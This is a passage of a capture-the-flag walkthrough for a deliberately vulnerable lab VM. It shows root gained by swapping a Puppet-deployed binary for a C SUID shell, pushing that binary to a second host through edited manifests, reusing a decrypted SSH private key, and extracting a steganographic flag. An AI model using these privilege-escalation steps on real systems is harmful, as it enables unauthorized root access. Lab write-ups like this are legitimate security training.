+</span><span class='line'>
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inside the <em>fiveeights</em> module there&rsquo;s another file referencing the contents of SSH authorized keys for the nleeson user:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sandieshaw@puppet:/etc/puppet/modules$ cat fiveeights/manifests/init.pp
+</span><span class='line'>## Nick's secret file hide the screw-ups
+</span><span class='line'>class fiveeights {
+</span><span class='line'>
+</span><span class='line'>## private key held elsewhere. Keep looking
+</span><span class='line'>  file { '/home/nleeson/.ssh/authorized_keys':
+</span><span class='line'>  content =&gt; "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCTPnm+I5zEPNUHc1PgmsIxK8XCvtRECY6nTFOdNL3CxVBepWLv0wgPWBIUAkP9nfPUshXo1EIjcvb0+RGtJ8KNbVK4vW2ZCwgNicUoYnCcVtSrGtz9oAnKpeGcCKAuHG6ybt4Opxe75eF4dZt2/aDRrPMw8PK8l8a3o9ZdJlIgdLiWORPiga/zUu1zuySkQPFHzPBp29MvWVwAYsssEjcXINfuvysPbdBzMJaJ2o4jmFV9g/uCz3xjRi9zULP1VpoRYtZUQadU2CpuN1RtVDeoSeYVe6vYkeLz6rCBQTUfi9Nea4X1JtvaTfnrquRMWOr43WnMMcdFpIsBd8oCI4jH root@puppet",
+</span><span class='line'>  }
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Another interesting module is the <em>wiggle</em> one, that references a binary called <em>spin</em> that needs to be present in /tmp, and when puppet runs it will change its ownership to root and make it SUID:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sandieshaw@puppet:/etc/puppet/modules$ cat wiggle/manifests/init.pp
+</span><span class='line'>## My first puppet module by Nick Leeson (C) Barringsbank
+</span><span class='line'>## Put spin binary in /tmp to confirm puppet is working
+</span><span class='line'>class wiggle {
+</span><span class='line'>
+</span><span class='line'>file { [ "/tmp/spin" ]:
+</span><span class='line'>  ensure  =&gt; present,
+</span><span class='line'>  mode    =&gt; 4755,
+</span><span class='line'>  owner   =&gt; root,
+</span><span class='line'>  group   =&gt; root,
+</span><span class='line'>  source  =&gt; "puppet:///modules/wiggle/spin";
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This module looks like the way in for privilege escalation. You can find the spin binary and its source code inside <em>/etc/puppet/modules/wiggle/files</em>, it just spins the cursor and outputs a character out of a list. Not too useful, but our sandieshaw user is the owner and has write permissions over it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sandieshaw@puppet:/etc/puppet/modules/wiggle/files$ ls -l
+</span><span class='line'>total 724
+</span><span class='line'>-rwxrwxr-x 1 sandieshaw sandieshaw 733480 Dec 21  2016 spin
+</span><span class='line'>-rw-rw-r-- 1 sandieshaw sandieshaw    376 Dec 17  2016 spin.c</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In order to exploit this, I created a malicious spin executable with a SUID shell:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then I copied it to the box:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>scp spin eric@192.168.159.136:/home/eric</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next I transferred it to the puppet VM:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>eric@analoguepond:~$ scp spin sandieshaw@192.168.122.2:/etc/puppet/modules/wiggle/files/spin
+</span><span class='line'>sandieshaw@puppet:/etc/puppet/modules/wiggle/files$ ls -l spin
+</span><span class='line'>-rwxrwxr-x 1 sandieshaw sandieshaw 16712 May 29 15:42 spin</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The next time the puppet agent runs, it puts the malicious spin binary in /tmp and makes it SUID root:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ls -l /tmp
+</span><span class='line'>total 20
+</span><span class='line'>-rwsr-xr-x 1 root root 16712 May 29 15:43 spin</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We are now able to become root:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sandieshaw@puppet:~$ /tmp/spin
+</span><span class='line'># ls /root
+</span><span class='line'>protovision</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inside /root/protovision we find some files and a hidden directory:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># ls -alh
+</span><span class='line'>total 24K
+</span><span class='line'>drwxr-xr-x 3 root root 4.0K Dec 21  2016 .
+</span><span class='line'>drwx------ 4 root root 4.0K Jan  7  2017 ..
+</span><span class='line'>-rw-r--r-- 1 root root  401 Dec 21  2016 flag1.txt.0xff
+</span><span class='line'>drwxr-xr-x 3 root root 4.0K Dec 21  2016 .I_have_you_now
+</span><span class='line'>-rw-r--r-- 1 root root   39 Dec 17  2016 jim
+</span><span class='line'>-rw-r--r-- 1 root root   53 Dec 17  2016 melvin</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Checking the flag first:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># cat flag1.txt.0xff
+</span><span class='line'>3d3d674c7534795a756c476130565762764e4849793947496c4a585a6f5248496b4a3362334e3363684248496842435a756c6d5a675148616e6c5762675533623542434c756c47497a564764313557617442794d79415362764a6e5a674d585a7446325a79463256676732593046326467777961793932646751334a754e585a765247497a6c47613042695a4a4279615535454d70647a614b706b5a48316a642f67325930463264763032626a35535a6956486431395765756333643339794c364d486330524861</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This hex string is decoded to a revere base64 string:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>==gLu4yZulGa0VWbvNHIy9GIlJXZoRHIkJ3b3N3chBHIhBCZulmZgQHanlWbgU3b5BCLulGIzVGd15WatByMyASbvJnZgMXZtF2ZyF2Vgg2Y0F2dgwyay92dgQ3JuNXZvRGIzlGa0BiZJByaU5EMpdzaKpkZH1jd/g2Y0F2dv02bj5SZiVHd19Weuc3d39yL6MHc0RHa</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I reversed it and decoded it for this hint:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>https://www.youtube.com/watch?v=GfJJk7i0NTk If this doesn't work, watch Wargames from 23 minutes in, you might find a password there or something...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Watching the clip, the interesting line is the shouted &ldquo;Backdoors are not secrets&rdquo;. This is confirmed by the jim and melvin files:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># cat jim
+</span><span class='line'>Mr Potato Head! Backdoors are not a...
+</span><span class='line'># cat melvin
+</span><span class='line'>Boy you guys are dumb! I got this all figured out...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inside the hidden folder we find a picture and another hidden folder:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>drwxr-xr-x 3 root root 4.0K Dec 18  2016 .a
+</span><span class='line'>-r-------- 1 root root  71K Dec 18  2016 grauniad_1995-02-27.jpeg</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The picture states that Barings Bank goes bust. The hidden folder goes on with another and another so I enumerated all:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># find . -type d
+</span><span class='line'>.
+</span><span class='line'>./.a
+</span><span class='line'>./.a/.b
+</span><span class='line'>./.a/.b/.c
+</span><span class='line'>./.a/.b/.c/.d
+</span><span class='line'>./.a/.b/.c/.d/.e
+</span><span class='line'>./.a/.b/.c/.d/.e/.f
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u.
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v.
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v./w.
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v./w./x.
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v./w./x./y
+</span><span class='line'>./.a/.b/.c/.d/.e/.f/.g/.h/.i/.j/.k/.l/.m/.n/.o/.p/.q/.r/.s/.t/.u./v./w./x./y/.z</span></code></pre></td></tr></table></div></figure>
+
+
+<p>All the way down, we find 2 files:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># ls
+</span><span class='line'>my_world_you_are_persistent_try  nleeson_key.gpg</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s see what we have here:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># cat my_world_you_are_persistent_try
+</span><span class='line'>joshua</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Might be a password for something later. The other file is related to the nleeson user we found on the other VM a while ago. I tried to decrypt it with the password <em>secrets</em>, but it didn&rsquo;t work. But the hint in the jim file was referring to a secret, so I tried <code>secret</code> and it decrypted a private SSH key for nleeson:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># gpg -d nleeson_key.gpg
+</span><span class='line'>gpg: CAST5 encrypted data
+</span><span class='line'>gpg: gpg-agent is not available in this session
+</span><span class='line'>gpg: encrypted with 1 passphrase
+</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
+</span><span class='line'>Proc-Type: 4,ENCRYPTED
+</span><span class='line'>DEK-Info: AES-128-CBC,1864E0393453C88F778D5E02717B8B16
+</span><span class='line'>
+</span><span class='line'>RTSpHZnf1Onpy3OHfSat0Bzbrx8wd6EBKlbdZiGjEB0AC4O0ylrSBoWsEJ/loSL8
+</span><span class='line'>jdTbcSG0/GWJU7CS5AQdK7KctWwqnOHe9y4V15gtZcfgxNLrVfMUVAurZ3n2wQqK
+</span><span class='line'>ARmqBXhftPft8EBBAwWwQmBrD+ufF2uaJoKr4Bfu0zMFQxRnNDooBes5wyNO/7k6
+</span><span class='line'>osvGqTEX/xwJG1GB5X0jsDCmBH4WXhafa0nzZXvd2Pd3UpaWPEgyq3vxIQaredR8
+</span><span class='line'>VbJbPSeKypTIj3UyEj+kjczhCiWw9t0Mv0aV4FtMOesnDQYJskL8kSLGRkN+7lHD
+</span><span class='line'>IcHz7az9oqYGBSq77lPkmk7oIpT/pg80pfCyHExROwlTRPzVRHv7KGiKd35R0Hl9
+</span><span class='line'>7CUQPCjH5ltQW4B6XUmxmoT8N14w5HOxb/JlV7s2g6dXYT0azOeqDsGivpgMY3vy
+</span><span class='line'>rtVakLIsZeYaZYSr6WvTFclXWYctYPMgzRewiRPjyn6DXiD6MtCJZj2CqJ47tP37
+</span><span class='line'>eRRgRRH6a1Sm/BkfSPIXlV0tTpOXfjtHG7VoIc5X343GL/WHM/nhNFvMLdRnVXRM
+</span><span class='line'>YOEKAsYklBLqZ99btTESwJZt9HG/cGpQrbgFwxKPoJy7f5wNLOa1ZhpDyw1IqokO
+</span><span class='line'>Pq4r8zZj4ASyg3gl7ByG11C272mkMG8yiIwOckVgNec/se18PUGBw1HHgRuyzDym
+</span><span class='line'>/6/cwkDzoJlResjsNDQCQcNzSOoZxi3GFIIiB+HjG84MF+ofnn3ayaUZLUaBbPMJ
+</span><span class='line'>jQ7dP6wqIMYwY5ZM6nRQ+RnL6QVBHnXH9RjmbzdVMzmQDjPS0lOg5xkU8B78vG6e
+</span><span class='line'>lphvmlLSM+PFVOqPwhVB8yon97aU23npKIOPu44VsUXU0auKI94qoX0I1EDDQFrE
+</span><span class='line'>UqpWUpCCHrRRTZCdnnE6RnJZ+rjGPvFA95lhUp1fpF8l4U3a8qKlsdtWmzYxHdyg
+</span><span class='line'>+w0QE8VdDsNqgCP7W6KzvN5E5HJ0bbQasadAX5eDd6I94V0fCZrPlzM+5CAXH4E4
+</span><span class='line'>qhmWQPCw7Q1CnW61yG8e9uD1W7yptK5NyZpHHkUbZGIS+P7EZtS99zDPh3V4N7I2
+</span><span class='line'>Mryzxkmi2JyQzf4T1cfK7JTdIC2ULGmFZM26BX3UCV0K+9OOGgRDPU4noS0gNHxP
+</span><span class='line'>VaWVmjGgubE4GDlW0tgw1ET+LaUdAv/LE+3gghpRLn1imdaW9elnIeaVeOWcyrBC
+</span><span class='line'>Ypl8AjYXNRd0uLWBC8xbakmK1tZUPXwefqjQpKjuIuYmmVes3M4DFxGQajmK03nO
+</span><span class='line'>oGaByHu0RVjy0x/zBuOuOp6eKpeaiLWfLM5DSIWlksL/2dmAloSs3LrIPu4dTnRb
+</span><span class='line'>v2YQ+72nLI62alLEaKwXUBoHSSRNTv0hbOyvV8YUp4EmJ8yShAmEE/n9Et62BwYB
+</span><span class='line'>rsi0RhEfih+43PzlwB91I4Elr2k3eBwQ9XiF3KdVgj6wvwqNLZ7aC5YpLcYaVyNT
+</span><span class='line'>fKzUxX02Ejvo60xWJ8u6GIhUK404s2WVeG/PCLwtrKGjpyPCn3yCWpCWpGPuVNrx
+</span><span class='line'>Wg0Um581e4Vw5CLDL5hRLmo7wiqssuL3/Uugf/lc2vF+MxJyoI1F9Zkt2xvRYrLB
+</span><span class='line'>-----END RSA PRIVATE KEY-----
+</span><span class='line'>gpg: WARNING: message was not integrity protected</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I extracted the private key and used it to SSH to the other VM as nleeson. It asked for a passphrase, and I used <em>joshua</em> from the file:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gpg nleeson_key.gpg &gt; nleeson_key
+</span><span class='line'>chmod 600 nleeson
+</span><span class='line'># ssh -i nleeson nleeson@192.168.122.3
+</span><span class='line'>Enter passphrase for key 'nleeson':
+</span><span class='line'>Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 4.4.0-57-generic x86_64)
+</span><span class='line'>
+</span><span class='line'> * Documentation:  https://help.ubuntu.com/
+</span><span class='line'>
+</span><span class='line'> System information disabled due to load higher than 1.0
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>The programs included with the Ubuntu system are free software;
+</span><span class='line'>the exact distribution terms for each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span><span class='line'>applicable law.
+</span><span class='line'>
+</span><span class='line'>nleeson@barringsbank:~$</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Rooting barringsbank</h2>
+
+<p>Inside nleeson&rsquo;s home there&rsquo;s nothing interesting. I found another reticulatingsplines picture like in eric&rsquo;s home. There wasn&rsquo;t anything exploitable around, but we know that Puppet is pushing configuration changes from the puppet VM. With my root privileges in that VM, I edited the <strong>nodes.pp</strong> and <strong>site.pp</strong> files in <code>/etc/puppet/manifests</code> to include the wiggle module on barringsbank as well:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>node 'barringsbank.example.com' inherits 'default' {
+</span><span class='line'>  include wiggle
+</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If you&rsquo;re wondering how long you have to wait for Puppet changes to propagate over the nodes, there&rsquo;s a cron job that runs every 10 minutes:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># Puppet Name: puppet check in
+</span><span class='line'>*/10 * * * * /usr/bin/puppet agent --test &gt; /dev/null 2&gt;&1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nothing&rsquo;s stopping us from running the agent though. Whichever way you choose, the spin binary will now appear in /tmp on barringsbank, and that&rsquo;s another root:</p>
+
+<p>Inside /root there&rsquo;s an image owned by nleeson that I transferred all the way back to my machine:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>-rw-rw-r--  1 nleeson nleeson 215K Dec 21  2016 me.jpeg</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="center" src="/images/pentest/analoguepond/me.jpeg" title="final flag" alt="final flag"></p>
+
+<h2>Final flag</h2>
+
+<p>Checking for embedded data on the image, we&rsquo;re being asked for a passphrase. I&rsquo;ve used all the hints, tried extrabacon as well..but remember the 2 cow pictures called reticulatingsplines found on 2 separate machines. Trying that as the passphrase worked:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>steghide info me.jpeg
+</span><span class='line'>"me.jpeg":
+</span><span class='line'>  format: jpeg
+</span><span class='line'>  capacity: 11.9 KB
+</span><span class='line'>Try to get information about embedded data ? (y/n) y
+</span><span class='line'>Enter passphrase:
+</span><span class='line'>  embedded file "primate_egyptian_flag.txt":
+</span><span class='line'>    size: 3.7 KB
+</span><span class='line'>    encrypted: rijndael-128, cbc
+</span><span class='line'>    compressed: yes</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I then extracted the file:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>steghide extract -sf me.jpeg
+</span><span class='line'>Enter passphrase:
+</span><span class='line'>wrote extracted data to "primate_egyptian_flag.txt".</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A big hex string that gets decoded to another reversed Base64 string. I used the CLI to decode the flag:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat primate_egyptian_flag.txt | xxd -p -r | rev | base64 -d
+</span><span class='line'>
+</span><span class='line'>Here's a fender bass for you...
+</span><span class='line'>
+</span><span class='line'>                                  ,-.        _.---._
+</span><span class='line'>                                |  `\.__.-''       `.
+</span><span class='line'>                                 \  _        _  ,.   \
+</span><span class='line'>           ,+++=._________________)_||______|_|_||    |
+</span><span class='line'>          (_.ooo.===================||======|=|=||    |
+</span><span class='line'>             ~~'                 |  ~'      `~' o o  /
+</span><span class='line'>                                  \   /~`\     o o  /
+</span><span class='line'>                                   `~'    `-.____.-'
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Congratulations to you once again and for the sixth time on capturing this
+</span><span class='line'>flag!
+</span><span class='line'>
+</span><span class='line'>I've tried to mix things up a bit here, to move away from throw metasploit
+</span><span class='line'>and web exploits at things. I hope you have enjoyed that portion and your
+</span><span class='line'>feedback on this aspect would be appreciated.
+</span><span class='line'>
+</span><span class='line'>Of note, these VMs are set to do automatic security updates using puppet,
+</span><span class='line'>so this ought to keep things dynamic enough for people.
+</span><span class='line'>
+</span><span class='line'>Many thanks to mrB3n, Rand0mByteZ and kevinnz for testing this CTF.
+</span><span class='line'>
+</span><span class='line'>A special thank you to g0tmi1k for hosting all these challenges and the
+</span><span class='line'>valuable advice. A tip of the hat to mrb3n for his recent assistance. Hit
+</span><span class='line'>me on IRC or twitter if you are looking for a hint or have completed the
+</span><span class='line'>challenge.
+</span><span class='line'>
+</span><span class='line'>Go on, Complete the circle: 06:30 to 07:45 of episode #1 of Our Friends In
+</span><span class='line'>The North (C) BBC 1995.. What's the connection....?
+</span><span class='line'>                                                           --Knightmare</span></code></pre></td></tr></table></div></figure>
+
+
